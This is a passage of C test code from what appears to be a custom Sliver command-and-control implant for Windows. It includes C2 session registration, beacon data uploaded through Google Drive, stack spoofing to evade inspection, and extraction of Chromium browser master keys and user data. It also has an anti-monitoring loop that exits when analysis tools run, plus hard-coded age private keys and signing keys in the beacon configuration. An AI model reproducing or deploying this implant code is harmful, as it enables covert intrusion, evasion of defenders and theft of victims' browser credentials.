	FREE(lpPath);
}

void test87(void) {
	DWORD dwFileAttribute = GetFileAttributesW(L"C:\\Users\\Admin\\Desktop\\Debug");
	if (dwFileAttribute & FILE_ATTRIBUTE_DIRECTORY) {
		PrintFormatW(L"Is Folder\n");
	}

	return;
}

void test88(void) {
	HMODULE hModule = NULL;

	hModule = LoadLibraryW(L"kernel32.dll");
	FARPROC lpProc = GetProcAddress(hModule, "HeapAlloc");
	PrintFormatW(L"hModule: %p, lpProc: %p\n", hModule, lpProc);
}

void test89(void) {
	WCHAR wszFullPath[MAX_PATH];
	LPWSTR lpFilePart = NULL;

	GetFullPathNameW(L"..\\..\\..\\Downloads", MAX_PATH, wszFullPath, NULL);
	PrintFormatW(L"wszFullPath: %s\n", wszFullPath);
}

void test90(void) {
	TIME_ZONE_INFORMATION TimeZone;
	CHAR szTimeZone[0x10];

	SecureZeroMemory(&TimeZone, sizeof(TimeZone));
	GetTimeZoneInformation(&TimeZone);
	PrintFormatW(L"Bias: %d\n", TimeZone.Bias);
	PrintFormatW(L"StandardBias: %d\n", TimeZone.StandardBias);
	PrintFormatW(L"StandardName: %s\n", TimeZone.StandardName);
	PrintFormatW(L"DaylightName: %s\n", TimeZone.DaylightName);
	PrintFormatW(L"DaylightBias: %d\n", TimeZone.DaylightBias);
	wsprintfA(szTimeZone, "%03d", TimeZone.Bias / (-60));
	PrintFormatA("%s\n", szTimeZone);
}

#define FILETIME_TO_UNIXTIME(ft) (UINT)((*(LONGLONG*)&(ft)-116444736000000000)/10000000)
void test91(void) {
	WCHAR lpPath[] = L"C:\\Users\\Admin\\Downloads\\Firefox Installer.exe";
	UINT64 uModifiedTime = 0;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	UINT64 uResult = 0;
	FILETIME LastWriteTime;

	hFile = CreateFileW(lpPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		LOG_ERROR("CreateFileW", GetLastError());
		return;
	}

	SecureZeroMemory(&LastWriteTime, sizeof(LastWriteTime));
	if (!GetFileTime(hFile, NULL, NULL, &LastWriteTime)) {
		LOG_ERROR("GetFileTime", GetLastError());
		return;
	}

	//uModifiedTime = GetModifiedTime(lpPath);
	uModifiedTime = FILETIME_TO_UNIXTIME(LastWriteTime);
	PrintFormatW(L"%lu\n", (DWORD)uModifiedTime);
}

void test92(void) {
	BYTE Buffer[] = { 73, 110, 116, 101, 108, 194, 174, 32, 83, 109, 97, 114, 116 };
	WCHAR wszOutput[0x100];

	MultiByteToWideChar(CP_UTF8, 0, Buffer, _countof(Buffer), wszOutput, _countof(wszOutput));
	//HexDump(wszOutput, sizeof(wszOutput));
	PrintFormatW(L"%d: wszOutput: %s\n", wszOutput);
}

void test93(void) {
	BYTE Buffer[] = { 10, 21, 10, 8, 65, 120, 73, 110, 115, 116, 83, 86, 18, 9, 108, 111, 99, 97, 108, 104, 111, 115, 116, 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 99, 49, 97, 52, 97, 52, 53, 100, 45, 101, 102, 51, 54, 45, 52, 51, 97, 54, 45, 57, 52, 55, 100, 45, 55, 102, 57, 97, 50, 55, 98, 56, 102, 49, 50, 56 };
	ENVELOPE Envelope;

	Envelope.pData = ALLOC(sizeof(BUFFER));
	Envelope.pData->pBuffer = Buffer;
	Envelope.pData->cbBuffer = sizeof(Buffer);
	ServiceDetailHandler(&Envelope);
}

void test94(void) {
	CHAR szMessage[] = "Hello World";
	PENVELOPE pRespEnvelope = CreateErrorRespEnvelope(szMessage, 9, 0);

	HexDump(pRespEnvelope->pData->pBuffer, pRespEnvelope->pData->cbBuffer);
}

void test95(void) {
	BYTE szBuffer[] = { 10, 41, 67, 58, 92, 87, 105, 110, 100, 111, 119, 115, 92, 83, 121, 115, 116, 101, 109, 51, 50, 92, 105, 99, 97, 99, 108, 115, 46, 101, 120, 101, 32, 67, 58, 92, 87, 105, 110, 100, 111, 119, 115, 24, 1, 34, 26, 67, 58, 85, 115, 101, 114, 115, 65, 100, 109, 105, 110, 68, 101, 115, 107, 116, 111, 112, 108, 111, 103, 46, 116, 120, 116, 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 101, 99, 100, 99, 100, 54, 98, 56, 45, 97, 52, 56, 54, 45, 52, 99, 99, 56, 45, 98, 57, 99, 52, 45, 50, 57, 97, 101, 98, 55, 97, 100, 99, 51, 53, 101 };
	ENVELOPE Envelope;
	PENVELOPE pRespEnvelope = NULL;

	SecureZeroMemory(&Envelope, sizeof(Envelope));
	Envelope.pData = ALLOC(sizeof(BUFFER));
	Envelope.pData->pBuffer = szBuffer;
	Envelope.pData->cbBuffer = sizeof(szBuffer);
	pRespEnvelope = ExecuteHandler(&Envelope);
	HexDump(pRespEnvelope->pData->pBuffer, pRespEnvelope->pData->cbBuffer);
	FreeEnvelope(pRespEnvelope);
}

void test96(void) {
	DeletePath(L"C:\\Users\\Admin\\Desktop\\Hello\\");
}

void test97(void) {
	//UnzipBuffer("C:\\Users\\Admin\\Desktop\\Hello.7z");
}

void test98(void) {
	Unzip(L"C:\\Users\\Admin\\Desktop\\Test.zip", L"C:\\Users\\Admin");
}

void test99(void) {
	if (IsFolderExist(L"..\\Removerr")) {
		PrintFormatW(L"Folder exist\n");
	}
	else {
		PrintFormatW(L"%d: Folder is not exist\n");
	}
}

void test100(void) {
	CompressPathByGzip(L"..\\..\\Desktop\\Folder", NULL);
}

void test101(void) {
	/*PSLIVER_HTTP_CLIENT pSliverClient = NULL;
	PBYTE pMarshaledRegisterInfo = NULL;
	DWORD cbMarshaledRegisterInfo = 0;
	PENVELOPE pRegisterEnvelope = NULL;

	pSliverClient = SliverSessionInit("http://ubuntu-icefrog2000.com");
	if (pSliverClient == NULL) {
		LogError(L"%s.%d: SliverSessionInit failed at %s\n", __FILE__, __LINE__, __FUNCTIONW__);
		goto CLEANUP;
	}

	PrintFormatA("pSliverClient->szSessionID: %s\n", pSliverClient->szSessionID);
	pSliverClient->HttpConfig.AdditionalHeaders[Cookie] = ALLOC(lstrlenA(pSliverClient->szSessionID) + lstrlenA(pSliverClient->lpCookiePrefix) + 1);
	wsprintfA(pSliverClient->HttpConfig.AdditionalHeaders[Cookie], "%s=%s", pSliverClient->lpCookiePrefix, pSliverClient->szSessionID);
	pMarshaledRegisterInfo = RegisterSliver(pSliverClient, &cbMarshaledRegisterInfo);
	if (pMarshaledRegisterInfo == NULL) {
		LogError(L"%s.%d: RegisterSliver failed at %s", __FILE__, __LINE__, __FUNCTIONW__);
		goto CLEANUP;
	}

	pRegisterEnvelope = ALLOC(sizeof(ENVELOPE));
	pRegisterEnvelope->uType = MsgRegister;
	pRegisterEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRegisterEnvelope->pData->pBuffer = pMarshaledRegisterInfo;
	pRegisterEnvelope->pData->cbBuffer = cbMarshaledRegisterInfo;
	WriteEnvelope(pSliverClient, pRegisterEnvelope);
	SessionMainLoop(pSliverClient);
CLEANUP:
	FreeEnvelope(pRegisterEnvelope);
	FreeSliverHttpClient(pSliverClient);
	return;*/
}

void test102(void) {
	PrintFormatW(L"Hello %d 0x%08x\n\n\n", 1, 2);
}

void test103(void) {
	WCHAR wszHello[] = L"Hello";
	LPWSTR lpPointer = NULL;

	DWORD dwIdx = TlsAlloc();
	PrintFormatW(L"Idx: 0x%08x\n", dwIdx);
	TlsSetValue(dwIdx, wszHello);
	lpPointer = (LPWSTR)TlsGetValue(dwIdx);
	PrintFormatW(L"Value: %s\n", lpPointer);
}

void test104(void) {
	DWORD dwThreadId = 0;
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)test103, NULL, 0, &dwThreadId);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
}

void test105(void) {
	RPC_STATUS Status = RPC_S_OK;
	UUID pUuid;
	WCHAR wszUuid[0x100];
	LPWSTR lpResult = NULL;

	Status = UuidCreateSequential(&pUuid);
	StringFromGUID2(&pUuid, wszUuid, _countof(wszUuid));
	lpResult = ALLOC(lstrlenW(wszUuid) * sizeof(WCHAR));
	lstrcpyW(lpResult, wszUuid + 1);
	lpResult[lstrlenW(lpResult) - 1] = L'\0';
	lpResult[14] = L'4';
	lpResult[19] = L'8';
	PrintFormatW(L"%s\n", lpResult);
}

void test106(void) {
	HANDLE hKernel32 = NULL;
	HANDLE hImage = NULL;
	LPVOID lpBaseThreadInitThunk = NULL;
	DWORD cbBaseThreadInitThunk = 0;
	PIMAGE_DOS_HEADER pDosHdr = NULL;
	PIMAGE_NT_HEADERS64 pNtHdr = NULL;
	PIMAGE_OPTIONAL_HEADER64 pOptionalHdr = NULL;
	DWORD dwExceptionDirRva = 0;
	DWORD cbExceptionDir = 0;
	PRUNTIME_FUNCTION pRuntimeFunc = NULL;
	LPVOID lpStartFunc = NULL;
	DWORD i = 0;
	PUINT64 pStackAddr = NULL;
	MEMORY_BASIC_INFORMATION64 MemInfo;
	UINT64 uStackValue = 0;

	hKernel32 = GetModuleHandleA("kernel32.dll");
	if (hKernel32 == NULL) {
		goto CLEANUP;
	}

	lpBaseThreadInitThunk = GetProcAddress(hKernel32, "BaseThreadInitThunk");
	hImage = GetModuleHandleA(NULL);
	pDosHdr = (PIMAGE_DOS_HEADER)hKernel32;
	pNtHdr = (PIMAGE_NT_HEADERS64)((ULONG_PTR)pDosHdr + pDosHdr->e_lfanew);
	pOptionalHdr = (PIMAGE_FILE_HEADER)&pNtHdr->OptionalHeader;
	dwExceptionDirRva = pOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
	cbExceptionDir = pOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;
	for (i = 0; i < cbExceptionDir; i += sizeof(RUNTIME_FUNCTION)) {
		pRuntimeFunc = (PRUNTIME_FUNCTION)((ULONG_PTR)hKernel32 + dwExceptionDirRva + i);
		lpStartFunc = (LPVOID)((ULONG_PTR)hKernel32 + pRuntimeFunc->BeginAddress);
		if (lpStartFunc == lpBaseThreadInitThunk) {
			cbBaseThreadInitThunk = pRuntimeFunc->EndAddress - pRuntimeFunc->BeginAddress;
			break;
		}
	}

	pStackAddr = (PUINT64)_AddressOfReturnAddress();
	SecureZeroMemory(&MemInfo, sizeof(MemInfo));
	if (VirtualQuery((LPVOID)pStackAddr, &MemInfo, sizeof(MemInfo)) == 0) {
		goto CLEANUP;
	}

	for (i = 0; i < MemInfo.BaseAddress + MemInfo.RegionSize; i += sizeof(UINT64)) {
		uStackValue = *(PUINT64)((ULONG_PTR)pStackAddr + i);
		if (uStackValue > (UINT64)lpBaseThreadInitThunk && uStackValue < (UINT64)lpBaseThreadInitThunk + cbBaseThreadInitThunk) {
			*(PUINT64)((ULONG_PTR)pStackAddr + i) = 0;
			break;
		}
	}

CLEANUP:
	return;
}

void test107() {
	PrintFormatW(L"Hello World");
}

int test108(void) {
	int a = 1;
	int b = 1;
	test107();
	return a + b;
}

void test109(void) {
	StackSpoofing(PrintFormatA, 5, "Hello %s, ID: %d, address: %p, hex value: 0x%08x", "Dat", 10, test109, 20);
}

void test110(void) {
	HINTERNET hHttpSession = NULL;
	HINTERNET hConnect = NULL;
	HINTERNET hRequest = NULL;
	WINHTTP_AUTOPROXY_OPTIONS AutoProxyOptions;
	WINHTTP_PROXY_INFO ProxyInfo;
	PDWORD pProxyEnable = NULL;
	DWORD cbOutput = 0;
	LPSTR lpProxyServer = NULL;
	BOOL ProxyEnable = FALSE;

	hHttpSession = WinHttpOpen(L"WinHTTP AutoProxy Sample/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if (!hHttpSession) {
		return;
	}

	hConnect = WinHttpConnect(hHttpSession, L"www.microsoft.com", INTERNET_DEFAULT_HTTP_PORT, 0);
	if (!hConnect) {
		return;
	}

	hRequest = WinHttpOpenRequest(hConnect, L"GET", L"ms.htm", L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
	if (!hRequest) {
		return;
	}

	SecureZeroMemory(&AutoProxyOptions, sizeof(AutoProxyOptions));
	AutoProxyOptions.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT;
	AutoProxyOptions.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
	AutoProxyOptions.fAutoLogonIfChallenged = TRUE;

	SecureZeroMemory(&ProxyInfo, sizeof(ProxyInfo));
	if (WinHttpGetProxyForUrl(hHttpSession, L"https://www.microsoft.com/ms.htm", &AutoProxyOptions, &ProxyInfo)) {
		ProxyEnable = TRUE;
	}
	else {
		if (QueryRegValue(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", L"ProxyEnable", &pProxyEnable, &cbOutput)) {
			if (*pProxyEnable == 1) {
				if (QueryRegValue(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", L"ProxyEnable", &lpProxyServer, &cbOutput)) {
					SecureZeroMemory(&ProxyInfo, sizeof(ProxyInfo));
					ProxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
					ProxyInfo.lpszProxy = ConvertCharToWchar(lpProxyServer);
					ProxyEnable = TRUE;
				}
			}
		}
	}

	if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY, &ProxyInfo, sizeof(ProxyInfo))) {
		return;
	}

	if (pProxyEnable != NULL) {
		FREE(pProxyEnable);
	}

	if (lpProxyServer != NULL) {
		FREE(lpProxyServer);
	}

	if (AutoProxyOptions.lpszAutoConfigUrl != NULL) {
		FREE(AutoProxyOptions.lpszAutoConfigUrl);
	}
}

void test111(void)
{
	HINTERNET hHttpSession = NULL;
	PWINHTTP_PROXY_INFO pProxyInfo = NULL;

	hHttpSession = WinHttpOpen(L"WinHTTP AutoProxy Sample/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if (!hHttpSession) {
		return;
	}

	pProxyInfo = ResolveProxy(hHttpSession, L"www.microsoft.com");
CLEANUP:
	if (pProxyInfo != NULL) {
		FREE(pProxyInfo);
	}
}

void test112(void) {
	CHAR szSecret[] = "GQH4RBUBSOLX446N2CBCS7AYHYLBMA2A";
	POTP_DATA pOtpData = NULL;
	UINT64 uResult = 0;

	pOtpData = OtpInit(30, 1, 8, szSecret);
	uResult = GetOtpNow(pOtpData);
	PrintFormatA("%d\n", uResult);
	if (pOtpData != NULL) {
		if (pOtpData->lpBase32Secret != NULL) {
			FREE(pOtpData->lpBase32Secret);
		}

		FREE(pOtpData);
	}
}

void test113(void) {
	CHAR Buffer[100];
	wsprintfA(Buffer, "%IX", (UINT64)test113);
	PrintFormatA("%s\n", Buffer);
}

void test114(void) {
	LPWSTR lpFullPath = NULL;

	lpFullPath = GetFullPathW(L"E:\\asdf\\..");
	PrintFormatW(L"%s\n", lpFullPath);
}

void test115(void) {
	PBUFFER pMarshaledEnvelope = NULL;
	DWORD i = 0;
	CHAR szName[] = "Demo.txt";
	PDRIVE_CONFIG pDriveConfig = NULL;
	CHAR szSessionIdPrefix[33];
	BOOL Result = FALSE;
	CHAR szMetadata[0x400];
	LPSTR lpBody = NULL;
	DWORD cbBody = 0;
	LPSTR lpUniqueBoundary = NULL;
	BOOL NoHeapMemory = FALSE;
	CHAR szContentType[0x80] = "multipart/form-data; boundary=";
	CHAR szUrl[] = "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart";
	PURI pUri = NULL;
	PHTTP_CLIENT pHttpClient = NULL;
	PHTTP_RESP pResp = NULL;
	PSLIVER_DRIVE_CLIENT pDriveClient = NULL;

	pMarshaledEnvelope = ALLOC(sizeof(BUFFER));
	pMarshaledEnvelope->pBuffer = DuplicateStrA("Hello from beacon", 0);
	pMarshaledEnvelope->cbBuffer = lstrlenA(pMarshaledEnvelope->pBuffer);
	pUri = UriInit(szUrl);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	pHttpClient = HttpClientInit(pUri);
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	lpBody = ALLOC(pMarshaledEnvelope->cbBuffer + 0x400);
	if (lpBody == NULL) {
		NoHeapMemory = TRUE;
		lpBody = VirtualAlloc(NULL, pMarshaledEnvelope->cbBuffer + 0x400, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (lpBody == NULL) {
			LOG_ERROR("VirtualAlloc", GetLastError());
			goto CLEANUP;
		}
	}

	wsprintfA(szMetadata, "{\"mimeType\":\"application/octet-stream\",\"name\":\"%s\",\"parents\":[\"root\"]}", szName);
	lpUniqueBoundary = GenRandomStr(16);
	cbBody = wsprintfA(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", lpUniqueBoundary, szMetadata, lpUniqueBoundary, szName);
	memcpy(&lpBody[cbBody], pMarshaledEnvelope->pBuffer, pMarshaledEnvelope->cbBuffer);
	cbBody += pMarshaledEnvelope->cbBuffer;
	cbBody += wsprintfA(&lpBody[cbBody], "\r\n--------WebKitFormBoundary%s--\r\n", lpUniqueBoundary);
	wsprintfA(szContentType, "multipart/form-data; boundary=------WebKitFormBoundary%s", lpUniqueBoundary);

	pDriveClient = DriveInit();
	pDriveConfig = pDriveClient->DriveList[0];
	if (!RefreshAccessToken(pDriveClient, pDriveConfig)) {
		goto CLEANUP;
	}

	pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "POST", szContentType, lpBody, cbBody, TRUE, FALSE);
	if (pResp->dwStatusCode != HTTP_STATUS_OK) {
		FreeHttpResp(pResp);
		goto CLEANUP;
	}

	FreeHttpResp(pResp);
	Result = TRUE;
CLEANUP:
	FreeHttpClient(pHttpClient);
	if (lpUniqueBoundary != NULL) {
		FREE(lpUniqueBoundary);
	}

	if (lpBody != NULL) {
		if (NoHeapMemory) {
			VirtualFree(lpBody, 0, MEM_RELEASE);
		}
		else {
			FREE(lpBody);
		}
	}

	FreeDriveClient(pDriveClient);
	FreeBuffer(pMarshaledEnvelope);
	return Result;
}

void test116(void) {
	DWORD dwNumberOfUserDatas = 0;
	PUSER_DATA* pResult = NULL;
	DWORD i = 0;

	pResult = PickChromium(&dwNumberOfUserDatas);
	for (i = 0; i < dwNumberOfUserDatas; i++) {
		FreeUserData(pResult[i]);
	}

	FREE(pResult);
}

void test117(void) {
	DWORD dwNumberOfUserDatas = 0;
	PUSER_DATA* pResult = NULL;
	DWORD i = 0;

	pResult = PickBrowsers(&dwNumberOfUserDatas);
	for (i = 0; i < dwNumberOfUserDatas; i++) {
		FreeUserData(pResult[i]);
	}

	FREE(pResult);
}

void test118(void) {
	USER_DATA UserData;

	SecureZeroMemory(&UserData, sizeof(UserData));
	UserData.lpKeyPath = DuplicateStrW(L"C:\\Users\\Admin\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", 0);
	GetChromiumMasterKey(&UserData);
}

void test119(void) {
	LPSTR lpResult = Base64Encode("Hello World", lstrlenA("Hello World"), FALSE);
	PrintFormatA("%s\n", lpResult);
}

void test120(void) {
	BYTE Buffer[] = { 97 ,103 ,101 ,49 ,51 ,110 ,121 ,108 ,56 ,116 ,117 ,101 ,103 ,99 ,99 ,119 ,112 ,50 ,101 ,56 ,52 ,112 ,114 ,112 ,120 ,116 ,99 ,100 ,116 ,55 ,109 ,99 ,50 ,109 ,52 ,107 ,52 ,53 ,57 ,104 ,114 ,54 ,50 ,51 ,118 ,102 ,116 ,48 ,101 ,115 ,55 ,107 ,100 ,51 ,118 ,115 ,122 ,104 ,114 ,118 ,107 ,117 };
	BUFFER Message;
	Message.pBuffer = Buffer;
	Message.cbBuffer = sizeof(Buffer);
	CHAR szSignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+WHpHstchyjZDtG8gsraZpGTaEGz7MvUQ8aas1Cnl1nbLv2a8jMLEbnKh4TEbYJaKuZAxlxLn4Jbdb1+T9Uf+g0=\ntrusted comment: timestamp:1729873121\nLZxs9NlszjyShQgFLxWrziZ7JzDMpgIBfPSOOkboexF8Eursc4SDtVlC1x5r9yTMqS67SHyJbl35/x6LJ3PRCw==";
	CHAR szMinisignServerPublicKey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";

	BOOL Result = MinisignVerify(&Message, szSignature, szMinisignServerPublicKey);
	PrintFormatA("Result: %d\n", Result);
}

void test121(void) {
	CHAR szRecipientPrivateKey[] = "AGE-SECRET-KEY-1H0HPRPWCF67PPNU3WS0SLXJZPYVPRCXERN3QV93JR2M84S82UC4QM24RFG";
	CHAR Ciphertext[] = { 97, 83, 51, 98, 50, 49, 99, 121, 110, 101, 78, 73, 89, 83, 53, 107, 101, 54, 90, 90, 76, 112, 72, 72, 67, 99, 77, 115, 50, 105, 116, 66, 73, 51, 122, 53, 107, 85, 122, 97, 104, 105, 107, 10, 90, 50, 97, 110, 65, 97, 69, 116, 111, 66, 106, 85, 103, 73, 71, 82, 101, 84, 89, 75, 97, 52, 99, 53, 81, 55, 90, 110, 107, 85, 48, 101, 73, 76, 70, 97, 79, 88, 89, 113, 75, 53, 69, 10, 45, 45, 45, 32, 109, 81, 114, 69, 108, 48, 113, 65, 55, 110, 117, 68, 113, 77, 108, 114, 105, 99, 97, 110, 57, 85, 48, 119, 102, 77, 68, 73, 84, 55, 55, 54, 48, 55, 57, 70, 117, 99, 53, 90, 48, 69, 81, 10, 80, 101, 245, 237, 116, 200, 23, 99, 156, 85, 35, 10, 161, 253, 221, 108, 193, 31, 234, 48, 171, 31, 168, 224, 135, 218, 61, 255, 22, 250, 96, 144, 175, 149, 68, 232, 128, 124, 53, 219, 158, 226, 175, 220, 152, 53, 112, 248, 19, 66, 6, 136, 157, 176, 66, 141, 107, 234, 128, 223, 169, 39, 249, 188 };
	BUFFER Buffer;
	PBUFFER pResult = NULL;

	Buffer.pBuffer = &Ciphertext;
	Buffer.cbBuffer = _countof(Ciphertext);
	pResult = AgeDecrypt(szRecipientPrivateKey, &Buffer);
	PrintFormatA("pResult:\n");
	HexDump(pResult->pBuffer, pResult->cbBuffer);
	FreeBuffer(pResult);
}

void test122(void) {
	PSTANZA_WRAPPER pStanzaList = NULL;
	CHAR Ciphertext[] = { 78, 106, 116, 98, 81, 47, 49, 81, 109, 115, 86, 54, 52, 101, 83, 113, 69, 105, 98, 50, 97, 121, 75, 101, 119, 77, 47, 106, 71, 68, 80, 52, 90, 88, 90, 71, 116, 50, 73, 55, 103, 86, 65, 10, 67, 86, 88, 53, 118, 108, 75, 114, 89, 80, 103, 112, 101, 55, 107, 43, 116, 113, 72, 56, 109, 119, 82, 104, 81, 113, 49, 100, 111, 87, 114, 118, 116, 66, 78, 79, 116, 86, 106, 89, 114, 79, 48, 10, 45, 45, 45, 32, 83, 85, 76, 108, 71, 56, 56, 117, 76, 80, 53, 99, 121, 118, 111, 81, 51, 56, 84, 87, 81, 68, 90, 109, 74, 106, 110, 57, 78, 109, 75, 118, 68, 75, 66, 66, 88, 112, 65, 87, 54, 116, 56, 10, 151, 161, 50, 125, 201, 131, 78, 23, 140, 226, 117, 173, 59, 185, 54, 143, 150, 37, 236, 185, 69, 233, 11, 0, 94, 109, 107, 160, 8, 175, 140, 30, 108, 130, 158, 60, 212, 52, 23, 60, 23, 86, 114, 235, 96, 227, 115, 254, 238, 169, 73, 152, 0, 76, 205, 60, 28, 60, 58, 133, 72, 110, 84, 89 };
	BYTE FileKey[] = { 224, 18, 103, 86, 180, 209, 104, 26, 46, 70, 147, 76, 165, 234, 170, 44 };
	CHAR szAgeMsgPrefix[] = "age-encryption.org/v1\n-> X25519 ";
	DWORD cbTempBuffer = 0;
	PBUFFER pCipherText = NULL;
	PBYTE pTempBuffer = NULL;
	PBYTE pMac = NULL;

	pCipherText = ALLOC(sizeof(BUFFER));
	pCipherText->pBuffer = Ciphertext;
	pCipherText->cbBuffer = sizeof(Ciphertext);

	cbTempBuffer = lstrlenA(szAgeMsgPrefix) + pCipherText->cbBuffer;
	pTempBuffer = ALLOC(cbTempBuffer);
	lstrcpyA(pTempBuffer, szAgeMsgPrefix);
	memcpy(pTempBuffer + lstrlenA(szAgeMsgPrefix), pCipherText->pBuffer, pCipherText->cbBuffer);
	pStanzaList = ParseStanza(pTempBuffer);

	pMac = HeaderMAC(pStanzaList, FileKey, sizeof(FileKey));
	HexDump(pMac, SHA256_HASH_SIZE);
	pCipherText->pBuffer = NULL;
	FreeBuffer(pCipherText);
	FREE(pTempBuffer);
	FREE(pMac);
}

VOID DetectMonitorSystem(VOID)
{
	while (TRUE) {
		if (CheckForBlackListProcess()) {
			ExitProcess(-1);
		}

		Sleep(1000);
	}
}

VOID Final(VOID)
{
	HANDLE hThread = NULL;
	DWORD dwThreadId = 0;
	PGLOBAL_CONFIG pGlobalConfig = NULL;

	UINT64 uEncoderNonce = 13;
	DWORD dwMaxFailure = 5;
	DWORD dwReconnectInterval = 600;

#ifdef _BEACON
	PSLIVER_BEACON_CLIENT pBeaconClient = NULL;
	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
	CHAR szPeerPubKey[] = "age1z8yd2vkrxqelp82fhhsqwql5zvvjl2jzc2us03uqu9j72ve79g8s4fcp6v";
	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-12FPRDVR7Y9J7GHHCE3R0UN0MKLC7RS3Z48NW0C9CJ3PWJU3HX6UQFLMXPN";
	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
	CHAR szSliverClientName[] = "SOFT_TUNIC";
	CHAR szConfigId[] = "e3db8606-9375-4678-82ad-954b426e1186";
#elif _SESSION
	// From Phan Chu Trinh
	/*PSLIVER_SESSION_CLIENT pSessionClient = NULL;
	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
	CHAR szPeerPubKey[] = "age1tcyjf48h55y58xcamwsacazg09p8hcsavhsgfjayavcd7wyc6agsldvken";
	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1A9QJL6AHV9P5XPKJNHF6KXN7JAHEXTD87VKMCR38TFPTQYXZC3TQKVMNZ7";
	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
	CHAR szSliverClientName[] = "DECISIVE_FERRY";
	CHAR szConfigId[] = "9ecd4772-22ed-428d-be07-a2579092f740";
	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+VacFX4iBgo3Zwwg5BZqS0vyFxr90q+W+jo0MLcsayVA3HjxsEpDDUkKELnT2i3Ivk+vBINWYqp5RoHjaIFRigg=\ntrusted comment: timestamp:1730336915\n38cF8Sf7WKAu2C73d/YA0nGC7tEoRz8qzfO1cSYa96aPtAoxi8Cua8Z2GUY1p7H7kouOlDrH6yiir2M/NpPRAQ==";*/

	// From Tu Dinh
	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
	CHAR szPeerPubKey[] = "age1dr6wu66ys8xw77ntv3c5323juar0mu3pfzh3w8keu7r26szctenq9ml0y9";
	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1WMHCENFT9V35KGJL7AC79LQ7YU595YYKYDZU4N5RXSDTVMK9KJ7SKS9GX0";
	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
	CHAR szSliverClientName[] = "PLASTIC_DATABASE";
	CHAR szConfigId[] = "8001d686-212d-42b6-a86f-0a9681cf2fe9";
	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+Uq5ZWjBjIeNjPAooGy+Gpce+sumpkwtSKhq1bumFSaTBscU1U935RabU7M+oII4JtgB37MnzuaBIG81eUG2VQA=\ntrusted comment: timestamp:1730113878\nCo1qxEq5AOdhuc1ZhSdRGUB58roaBdKF/og6W/2g/3g2s0jpXWyqmVNwXLHszJdFl78diQ15qd1KmmWPRRdmAw==";
#else
	// From Phan Chu Trinh
	/*PSLIVER_SESSION_CLIENT pSessionClient = NULL;
	CHAR szPeerPubKey[] = "age15m9jy6r9m7296x0m4azhp06883llkw8kpyzs64mte5rv5s5zrf6qz2hmse";
	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-15T653732A6NJFGP0RCUL3UUEE0JY0D9YRRL0WJ5T697SZSULA4WSL4KEV2";
	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
